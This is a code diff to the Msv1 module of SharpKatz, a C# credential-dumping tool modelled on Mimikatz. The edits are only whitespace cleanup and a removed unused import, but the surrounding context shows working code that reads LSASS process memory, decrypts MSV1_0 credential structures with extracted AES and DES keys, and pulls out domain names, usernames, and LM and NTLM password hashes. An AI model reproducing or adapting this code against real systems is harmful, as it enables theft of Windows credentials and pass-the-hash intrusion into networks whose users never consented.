@@ -9,7 +9,6 @@ using SharpKatz.Crypto;
 using System;
 using System.Collections.Generic;
 using System.Linq;
-using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Text;
 using static SharpKatz.Module.Pth;
@@ -19,7 +18,7 @@ namespace SharpKatz.Module
 {
     class Msv1
     {
-        
+
         [StructLayout(LayoutKind.Sequential)]
         public struct LIST_ENTRY
         {
@@ -242,7 +241,7 @@ namespace SharpKatz.Module
         public static int FindCredentials(IntPtr hLsass, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
         {
 
-            foreach(Logon logon in logonlist)
+            foreach (Logon logon in logonlist)
             {
                 IntPtr lsasscred = logon.pCredentials;
                 LUID luid = logon.LogonId;
@@ -250,13 +249,13 @@ namespace SharpKatz.Module
                 {
 
                     Msv msventry = new Msv();
-                    
+
                     KIWI_MSV1_0_PRIMARY_CREDENTIALS primaryCredentials;
 
                     while (lsasscred != IntPtr.Zero)
                     {
                         byte[] credentialsBytes = Utility.ReadFromLsass(ref hLsass, lsasscred, Marshal.SizeOf(typeof(KIWI_MSV1_0_CREDENTIALS)));
-                        
+
                         IntPtr pPrimaryCredentials = new IntPtr(BitConverter.ToInt64(credentialsBytes, Utility.FieldOffset<KIWI_MSV1_0_CREDENTIALS>("PrimaryCredentials")));
                         IntPtr pNext = new IntPtr(BitConverter.ToInt64(credentialsBytes, Utility.FieldOffset<KIWI_MSV1_0_CREDENTIALS>("next")));
 
@@ -279,7 +278,7 @@ namespace SharpKatz.Module
                                 UNICODE_STRING usUserName = Utility.ReadStruct<UNICODE_STRING>(Utility.GetBytes(msvDecryptedCredentialsBytes, oshelper.UserNameOffset, Marshal.SizeOf(typeof(UNICODE_STRING))));
 
                                 msventry = new Msv();
-                                msventry.DomainName = Encoding.Unicode.GetString(Utility.GetBytes(msvDecryptedCredentialsBytes, usLogonDomainName.Buffer.ToInt64(), usLogonDomainName.Length)); 
+                                msventry.DomainName = Encoding.Unicode.GetString(Utility.GetBytes(msvDecryptedCredentialsBytes, usLogonDomainName.Buffer.ToInt64(), usLogonDomainName.Length));
                                 msventry.UserName = Encoding.Unicode.GetString(Utility.GetBytes(msvDecryptedCredentialsBytes, usUserName.Buffer.ToInt64(), usUserName.Length));
                                 msventry.Lm = Utility.PrintHashBytes(Utility.GetBytes(msvDecryptedCredentialsBytes, oshelper.LmOwfPasswordOffset, LM_NTLM_HASH_LENGTH));
                                 msventry.Ntlm = Utility.PrintHashBytes(Utility.GetBytes(msvDecryptedCredentialsBytes, oshelper.NtOwfPasswordOffset, LM_NTLM_HASH_LENGTH));
@@ -303,7 +302,7 @@ namespace SharpKatz.Module
                     }
                 }
 
-            } 
+            }
 
             return 0;
         }
